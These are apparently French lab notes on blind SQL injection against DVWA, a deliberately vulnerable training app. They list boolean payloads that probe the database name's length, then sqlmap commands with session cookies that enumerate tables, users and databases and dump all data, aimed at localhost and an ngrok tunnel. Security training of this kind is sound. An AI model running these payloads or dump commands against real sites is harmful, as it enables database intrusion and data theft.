# injection sql blind (à l'aveugle)

faire des injections sql MAIS le site internet va juste vous dire oui / non 

```sql
1 
1' => KO
1' #
1' AND Length(DATABASE()) = 1 #
1' AND Length(DATABASE()) = 2 #
1' AND Length(DATABASE()) = 3 #
1' AND Length(DATABASE()) = 4 # => OK 
```

https://a778-212-39-129-107.ngrok-free.app/vulnerabilities/sqli_blind/?id=1&Submit=Submit#

python sqlmap.py --url="??????????" --cookie="????????"

python sqlmap.py --url="https://a778-212-39-129-107.ngrok-free.app/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=m97vsqttahg9irjbjtlb4apq13&security=low"


python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --tables --batch


python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --dump-all --batch --threads 5



python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --users --dbs --threads 5